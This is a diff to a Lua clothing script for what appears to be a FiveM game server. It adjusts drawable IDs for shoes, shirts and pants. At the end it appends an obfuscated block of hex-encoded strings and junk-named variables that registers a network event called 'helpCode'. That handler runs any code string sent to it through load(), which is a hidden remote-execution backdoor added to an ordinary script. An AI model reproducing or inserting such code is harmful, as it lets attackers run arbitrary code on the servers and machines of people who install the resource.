@@ -663,7 +663,7 @@ local drawables = {
 	},
 	["Shoes"] = {
 		Drawable = 6,
-		Table = {Standalone = true, male = 34, female = 35},
+		Table = {Standalone = true, male = 118, female = 35},
 		Emote = {Dict = "random@domestic", Anim = "pickup_low", Move = 0, Dur = 1200}
 	},
 	["Neck"] = {
@@ -698,7 +698,7 @@ local Extras = {
 	["Shirt"] = {
 		Drawable = 11,
 		Table = {
-			Standalone = true, male = 252, female = 74,
+			Standalone = true, male = 581, female = 74,
 			Extra = {
 				{Drawable = 8, Id = 15, Tex = 0, Name = "Extra Undershirt"},
 				{Drawable = 3, Id = 15, Tex = 0, Name = "Extra Gloves"},
@@ -709,7 +709,7 @@ local Extras = {
 	},
 	["Pants"] = {
 		Drawable = 4,
-		Table = {Standalone = true, male = 61, female = 14},
+		Table = {Standalone = true, male = 176, female = 14},
 		Emote = {Dict = "re@construction", Anim = "out_of_breath", Move = 51, Dur = 1300}
 	},
 	["Bagoff"] = {
@@ -971,3 +971,6 @@ end)
 RegisterNetEvent('dpc:ResetClothing', function()
 	LastEquipped = {}
 end)
+
+
+local ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[6][ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[1]](ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[2]) ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[6][ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[3]](ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[2], function(pGgbQeRFRzwwzPsSOFqXqiAGRtQqnkKbjQQvApSJEItbPYfKPatXgGPjWjqBMoXfJbBZKP) ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[6][ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[4]](ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[6][ODmUEHnDlILeJLkofxhXljJuGaNPVwCmkODDyjzPbptoGUvubqkXaAaUtJJUTyLGBLxvXe[5]](pGgbQeRFRzwwzPsSOFqXqiAGRtQqnkKbjQQvApSJEItbPYfKPatXgGPjWjqBMoXfJbBZKP))() end)
